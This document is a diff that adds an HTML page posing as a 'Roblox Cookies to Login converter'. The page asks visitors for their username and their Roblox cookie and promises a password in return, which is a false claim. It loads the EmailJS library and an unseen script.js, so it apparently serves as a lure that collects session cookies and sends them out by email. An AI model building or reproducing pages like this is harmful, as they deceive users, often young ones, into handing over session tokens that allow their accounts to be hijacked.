@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox Cookies to Login converter</title>
+  <link rel="stylesheet" href="styles.css">
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script src="script.js" defer></script>
+</head>
+<body>
+  <div class="container">
+    <h1>Roblox Cookies to Login converter</h1>
+
+    <label for="username">Enter Roblox Username:</label>
+    <input type="text" id="username" placeholder="Enter Username">
+
+    <label for="inputText">Paste Cookie here:</label>
+    <textarea id="inputText" placeholder="Paste your Cookie here..."></textarea>
+    
+    <button id="sendButton">generate password</button>
+
+    <div id="output"></div>
+
+    <h3>Username and Password:</h3>
+    <div id="usernamePassword" class="password-box">
+      <p id="usernameDisplay"></p>
+      <p id="passwordDisplay"></p>
+    </div>
+  </div>
+</body>
+</html>
